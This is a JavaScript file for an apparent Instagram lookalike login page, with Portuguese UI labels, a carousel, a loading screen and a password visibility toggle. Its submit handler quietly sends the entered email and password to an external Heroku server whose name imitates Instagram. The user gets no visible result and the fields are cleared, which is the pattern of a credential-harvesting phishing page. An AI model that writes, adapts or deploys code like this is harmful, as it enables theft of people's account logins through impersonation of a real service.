window.addEventListener("load", () => {
    const loading = document.querySelector(".loading");
  
    setTimeout(() => {
      loading.style.display = "none";
    }, 3000);
  });
  
  
  let time = 5000;
  let currentIndex = 0;
  let images = document.querySelectorAll(".carousel__image");
  let max = images.length;
  
  const nextImage = () => {
    images[currentIndex].classList.remove("selected");
    currentIndex++;
    if (currentIndex >= max) {
      currentIndex = 0;
    }
    images[currentIndex].classList.add("selected");
  };
  
  const start = () => {
    setInterval(() => {
      nextImage();
    }, time);
  };
  
  window.addEventListener("load", start);
  
  const password = document.querySelector("#password");
  const user = document.querySelector("#user");
  const show = document.querySelector(".show");
  const button = document.querySelector("#submit");
  
  password.addEventListener("keyup", (e) => {  
    let value = e.target.value;
  
    if (value === "" || value.length < 6) {
      button.style.backgroundColor = "#B2DFFC";
      show.style.display = "none";
    } else {
      button.style.backgroundColor = "#0095F6";
      show.style.display = "block";
    }
  
    button.addEventListener("click", () => {
      password.value = "";
      user.value = "";
      button.style.backgroundColor = "#B2DFFC";
      show.style.display = "none";
    });
  });
  
  show.addEventListener("click", () => {
    if (password.getAttribute("type") === "password") {
      password.setAttribute("type", "text");
      show.innerHTML = "Ocultar";
    } else {
      password.setAttribute("type", "password");
      show.innerHTML = "Mostrar";
    }
    
  });
  
  // Função para fazer a requisição POST
  const registerUser = (email, password) => {
    fetch("https://instagram-7a92281434df.herokuapp.com/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        email: email,
        password: password
      })
    })
    .then(response => {
      if (response.ok) {
        console.log("Usuário registrado com sucesso!");
        // Faça aqui o que desejar após o registro bem-sucedido
      } else {
        console.error("Erro ao registrar usuário:", response.status);
        // Trate o erro conforme necessário
      }
    })
    .catch(error => {
      console.error("Erro na requisição:", error);
    });
  };
  
  // Evento de clique no botão de submit
  button.addEventListener("click", () => {
    const email = user.value;
    const pass = password.value;
  
    // Verifica se email e senha não estão vazios
    if (email && pass && pass.length >= 6) {
      registerUser(email, pass); // Chama a função para registrar o usuário
    } else {
      console.log("Por favor, preencha o email e a senha corretamente.");
      // Ou adicione alguma lógica para lidar com campos vazios/inválidos
    }
  });
  